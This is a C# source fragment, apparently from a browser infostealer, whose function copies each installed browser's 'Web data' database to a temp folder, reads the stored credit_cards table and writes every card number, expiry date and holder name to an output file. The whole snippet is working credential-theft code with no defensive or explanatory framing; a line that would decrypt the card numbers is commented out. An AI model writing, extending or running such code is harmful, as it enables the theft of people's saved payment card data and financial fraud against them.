// cards
public static void SAVE(string filename)
{
    int counter = 0;

    using (StreamWriter sw = new StreamWriter(filename))
    {
        foreach (string browser in Paths.Browser)
        {
            string Browser = Paths.GetUserData(browser) + "Web data";
            if (File.Exists(Browser))
            {
                string temp = Environment.GetEnvironmentVariable("temp") + "\\browserCreditCards";
                if (File.Exists(temp))
                {
                    File.Delete(temp);
                }
                File.Copy(Browser, temp);

                SQL sSQLite = new SQL(temp);
                sSQLite.ReadTable("credit_cards");

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    string number = sSQLite.GetValue(i, 4);
                    string expYear = sSQLite.GetValue(i, 3);
                    string expMonth = sSQLite.GetValue(i, 2);
                    string name = sSQLite.GetValue(i, 1);

                    if (string.IsNullOrEmpty(number))
                    {
                        break;
                    }

                    //credentials.number = Crypt.decryptChrome(number, Browser);

                    try
                    {
                        sw.WriteLine($"CCNum: {number} | ExpMo: {expMonth} | ExpYr: {expYear} | Holder: {name}");
                        counter++;
                    }
                    catch { }

                    continue;
                }
            }
        }
    }

    Console.WriteLine($"Found {counter} cards data and saved in {filename}");
}